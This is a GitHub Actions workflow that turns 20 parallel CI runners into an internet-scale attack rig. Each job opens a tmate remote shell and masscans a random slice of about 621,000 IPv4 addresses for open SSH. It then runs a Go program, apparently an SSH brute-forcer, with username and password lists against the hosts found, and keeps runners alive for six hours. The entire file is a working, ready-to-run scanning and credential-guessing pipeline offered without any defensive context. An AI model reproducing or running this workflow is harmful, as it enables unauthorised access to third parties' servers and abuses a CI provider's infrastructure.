name: CI

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    strategy:
      fail-fast: false
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]

    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: sudo apt update && sudo apt install wget tmate -y

      - name: Start tmate in background
        run: |
          tmate -S /tmp/tmate.sock new-session -d
          tmate -S /tmp/tmate.sock wait tmate-ready
          
          echo "ðŸŸ¢ TMATE SESSION STARTED"
          echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')"
          echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')"
          
          while true; do
            sleep 60
            echo "ðŸ¤– Tmate session still active for instance ${{ matrix.instance }}"
          done &
          TMATE_LOOP_PID=$!
          echo "TMATE_PID=$TMATE_LOOP_PID" >> $GITHUB_ENV

      - name: Print job info
        run: echo "ðŸ”¹ Running instance ${{ matrix.instance }} of 20"

      - name: Install additional dependencies
        run: |
          sudo apt install -y golang masscan libpcap-dev python3-pip
          pip3 install requests

      - name: Randomly distribute and scan IPs across instances
        continue-on-error: true
        run: |
          MAIN_IP_FILE="all_ipv4.txt"
          INSTANCE_ID=${{ matrix.instance }}
          INSTANCE_COUNT=20
          TOTAL_IPS=621457
    
          echo "ðŸ” Instance $INSTANCE_ID of $INSTANCE_COUNT"
    
          if [ -f "$MAIN_IP_FILE" ] && [ -s "$MAIN_IP_FILE" ]; then
            # Calculate IPs per instance
            IPS_PER_INSTANCE=$((TOTAL_IPS / INSTANCE_COUNT))
      
            echo "ðŸ“Š Each instance will scan $IPS_PER_INSTANCE random IPs"
      
            # Get random subset for this instance directly from main file
            INSTANCE_IP_FILE="ipv4_instance_${INSTANCE_ID}.txt"
      
            # Use shuf to randomly select IPs for this instance
            # This ensures each instance gets a unique random set
            shuf -n $IPS_PER_INSTANCE "$MAIN_IP_FILE" > "$INSTANCE_IP_FILE"
      
            INSTANCE_IP_COUNT=$(wc -l < "$INSTANCE_IP_FILE")
            echo "ðŸ” Instance $INSTANCE_ID will scan $INSTANCE_IP_COUNT random IPs"
      
            # Run masscan
            sudo masscan -iL "$INSTANCE_IP_FILE" -p22 --rate=15000 | \
              awk '/Discovered/{split($4,p,"/"); print $6 ":" p[1]}' > "open_${INSTANCE_ID}.txt"
      
            FOUND_COUNT=$(wc -l < "open_${INSTANCE_ID}.txt")
            echo "âœ… Instance $INSTANCE_ID: Found $FOUND_COUNT open ports from $INSTANCE_IP_COUNT IPs"
          else
            echo "âŒ Main IP file $MAIN_IP_FILE not found or empty!"
            touch "open_${INSTANCE_ID}.txt"
          fi

      - name: Run Go program
        continue-on-error: true
        run: |
          echo "ðŸš€ Starting Go program for instance ${{ matrix.instance }}..."
          
          # Initialize Go module if needed
          if [ ! -f "go.mod" ]; then
            go mod init telee.go
          fi
          
          go mod tidy
          
          # Run Go program with instance-specific open file
          go run telee.go user.txt pass.txt open_${{ matrix.instance }}.txt 20 50 500 &
          SETUP_PID=$!
          
          wait $SETUP_PID || echo "âš ï¸ Go program exited with error"

      - name: Keep alive for 6 hours
        if: always()
        continue-on-error: true
        run: |
          echo "â³ Instance ${{ matrix.instance }} finished main tasks, keeping tmate alive for 6 hours..."
          echo "Connect via tmate if needed"
          sleep 21600  # 6 hours
